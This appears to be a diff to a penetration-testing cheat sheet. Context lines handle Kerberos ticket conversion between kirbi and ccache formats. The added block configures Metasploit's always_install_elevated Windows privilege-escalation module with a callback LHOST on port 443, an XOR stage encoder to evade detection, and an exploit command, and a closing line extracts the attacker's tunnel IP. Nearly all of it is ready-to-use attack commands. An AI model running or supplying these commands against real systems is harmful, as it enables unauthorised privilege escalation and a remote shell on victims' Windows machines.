@@ -29,4 +29,13 @@ run inputpath=ticket.kirbi outputpath=ticket.ccache
 run inputpath=ticket.ccache outputpath=ticket.kirbi
 export KRB5CCNAME=$PWD/ticket.ccache
 
+# always install elevated
+use windows/local/always_install_elevated
+set LHOST <LHOST>
+set LPORT 443
+set SESSION <SESSION>
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+exploit
+
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
